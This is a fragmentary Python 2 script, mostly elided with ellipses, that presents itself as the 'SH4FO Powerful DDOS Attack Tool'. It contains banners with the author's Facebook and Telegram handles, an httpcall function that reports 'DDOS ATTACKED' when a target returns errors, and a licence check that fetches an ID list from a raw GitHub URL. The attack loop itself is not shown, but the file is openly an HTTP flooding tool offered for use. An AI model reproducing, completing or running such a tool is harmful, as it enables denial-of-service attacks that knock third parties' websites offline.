...
╰━━━┻╯╱╰╯╱╱╰┻╯╱╱╰━━━╯
    ...
    SH4FO  Powerful DDOS Attack Tool // Oo SH4FO  (SH4FO 404) // Facebook : shafo✓& Telegram : 7usa_sh4lti 
...
╰━━━┻╯╱╰╯╱╱╰┻╯╱╱╰━━━╯
   ...
   SH4FO Powerful DDOS Attack Tool //  SH4FO (SH4FO 404) // Facebook : SH4FO & Telegram : 7usa_sh4lti
...
def usage():
	...
	print '#  Facebook : SH4FO & Telegram : 7usa_sh4lti #'
	print '####################################################'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print '\x1b[31;1m SH4FO DDOS ATTACKED'
			code=500
...
def chk():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/kakshafo/7usa/main/IDACTIVE.txt").text
    httpBand = requests.get("https://raw.githubusercontent.com/kakshafo/7usa/main/IDACTIVE.txt").text
    if id in httpBand:
